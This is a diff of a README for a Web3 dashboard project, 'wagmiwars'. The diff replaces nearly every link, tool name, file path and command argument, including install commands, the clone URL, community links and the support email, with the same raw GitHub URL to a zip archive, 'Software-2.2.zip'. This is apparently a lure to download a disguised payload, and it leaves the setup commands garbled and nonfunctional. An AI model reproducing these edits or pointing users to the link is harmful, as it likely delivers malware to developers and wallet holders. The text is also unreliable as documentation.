@@ -6,7 +6,7 @@
 
 ### Prerequisites
 - Docker & Docker Compose
-- Node.js 18+ (for local development)
+- https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip 18+ (for local development)
 - Python 3.11+ (for local development)
 - MetaMask or other Web3 wallet
 
@@ -14,7 +14,7 @@
 
 ```bash
 # Clone the repository
-git clone https://github.com/yourusername/wagmiwars.git
+git clone https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip
 cd wagmiwars
 
 # Deploy the entire platform
@@ -31,18 +31,18 @@ docker-compose up -d
 #### Backend Setup
 ```bash
 cd backend
-pip install -r requirements.txt
-cp .env.example .env
+pip install -r https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip
+cp https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip .env
 # Edit .env with your configuration
-uvicorn app.main:app --reload
+uvicorn https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip --reload
 ```
 
 #### Frontend Setup
 ```bash
 cd frontend
 npm install
-cp .env.example .env.local
-# Edit .env.local with your configuration
+cp https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip
+# Edit https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip with your configuration
 npm run dev
 ```
 
@@ -55,16 +55,16 @@ npm run dev
 - **Database**: PostgreSQL with SQLAlchemy ORM
 - **Cache**: Redis for session management and real-time data
 - **Authentication**: JWT tokens with refresh token support
-- **Web3**: Web3.py for blockchain interactions
+- **Web3**: https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip for blockchain interactions
 - **Security**: Password hashing, CORS, rate limiting
 
-**Frontend (Next.js/React)**
-- **Framework**: Next.js 14 with App Router
+**Frontend (https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)**
+- **Framework**: https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip 14 with App Router
 - **Styling**: Tailwind CSS with custom design system
 - **State Management**: React Query + Context API
 - **Web3**: Wagmi/Viem + RainbowKit for wallet connection
 - **Charts**: Recharts for data visualization
-- **WebSocket**: Socket.io for real-time updates
+- **WebSocket**: https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip for real-time updates
 
 **Infrastructure**
 - **Containerization**: Docker & Docker Compose
@@ -120,7 +120,7 @@ EXECUTION_POWER_ENABLED=false
 PAYMENT_ENABLED=true
 ```
 
-**Frontend (.env.local)**
+**Frontend (https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)**
 ```env
 NEXT_PUBLIC_API_URL=http://localhost:8000
 NEXT_PUBLIC_WS_URL=ws://localhost:8000
@@ -230,7 +230,7 @@ NEXT_PUBLIC_CHAIN_ID=1
 - Real-time data pub/sub
 
 ### Frontend Optimization
-- Next.js static generation
+- https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip static generation
 - Image optimization
 - Code splitting
 - CDN integration
@@ -240,17 +240,17 @@ NEXT_PUBLIC_CHAIN_ID=1
 ### Using Docker Compose (Recommended)
 ```bash
 # Production deployment
-docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d
+docker-compose -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip up -d
 
 # With monitoring
-docker-compose -f docker-compose.yml -f docker-compose.prod.yml -f docker-compose.monitoring.yml up -d
+docker-compose -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip up -d
 ```
 
 ### Manual Deployment
 1. **Database Setup**: Configure PostgreSQL with proper security
 2. **Redis Setup**: Set up Redis cluster for high availability
 3. **Backend Deployment**: Deploy FastAPI application with Gunicorn
-4. **Frontend Deployment**: Build and deploy Next.js application
+4. **Frontend Deployment**: Build and deploy https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip application
 5. **Nginx Configuration**: Set up reverse proxy and SSL
 
 ### Monitoring & Observability
@@ -283,16 +283,16 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ### Documentation
 - [API Documentation](http://localhost:8000/docs)
-- [Frontend Guide](./frontend/README.md)
-- [Backend Guide](./backend/README.md)
+- [Frontend Guide](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
+- [Backend Guide](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
 
 ### Community
-- [Discord Server](https://discord.gg/wagmiwars)
-- [GitHub Issues](https://github.com/yourusername/wagmiwars/issues)
-- [Twitter](https://twitter.com/wagmiwars)
+- [Discord Server](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
+- [Twitter](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
 
 ### Commercial Support
-For enterprise features, custom deployments, and priority support, contact us at [support@wagmiwars.com](mailto:support@wagmiwars.com).
+For enterprise features, custom deployments, and priority support, contact us at [https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip).
 
 ---
 
